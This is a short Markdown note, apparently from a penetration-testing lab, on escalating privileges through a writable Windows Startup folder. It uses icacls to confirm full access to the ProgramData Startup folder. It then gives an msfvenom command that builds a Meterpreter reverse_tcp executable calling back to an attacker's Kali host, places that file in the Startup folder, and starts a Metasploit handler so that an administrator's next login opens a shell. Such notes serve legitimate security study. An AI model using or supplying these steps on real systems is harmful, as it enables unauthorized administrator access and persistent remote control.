### Check for startup applications
For checking the ACLs in windows we will use **icacls** . This tool will help us to see what permissions we have in the startup applications

Below are the permissions
![[Pasted image 20210718172113.png]]

To run icacls use the following command
```powershell
icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
```

After running this you may see something like this
![[Pasted image 20210718172459.png]]

We have full access as denoted by `<F>`

https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/icacls

### Generating the payload
Type the following command to generate a metasploit payload
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=[Kali VM IP Address] LPORT=[Kali VM Port] -f exe -o x.exe
```

Transfer the file and save it in following location
```powershell
"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
```

In Kali run ```exploit/multi/handler``` with payload set and type run

Logout from windows and log in with administrator accout you will get the shell
